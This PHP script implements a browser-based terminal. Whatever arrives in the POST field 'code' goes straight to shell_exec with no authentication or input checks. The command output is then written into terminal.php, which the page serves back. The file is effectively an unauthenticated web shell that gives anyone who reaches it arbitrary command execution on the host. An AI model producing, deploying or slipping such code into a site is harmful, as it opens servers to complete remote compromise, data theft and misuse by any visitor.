<?php
if (!empty($_POST['code'])) {

    $result = "";
    $result = shell_exec($_POST['code']);

    $file = 'terminal.php';
    libxml_use_internal_errors( true );
    $dom=new DOMDocument;
    $dom->validateOnParse=false;
    $dom->recover=true;
    $dom->strictErrorChecking=false;
    $dom->loadHTMLFile( $file );
    $errors = libxml_get_errors();
    libxml_clear_errors();

    $line=$dom->createElement('div');
    $line->textContent=$result;

    /* use [] notation rather than ->item(0) */
    $dom->getElementsByTagName('form')[0]->appendChild( $line );


    /* write changes back to the html file - ie: save */
    $dom->saveHTMLFile( $file );

}

include ('terminal.php');
include('terminal-clear.php');

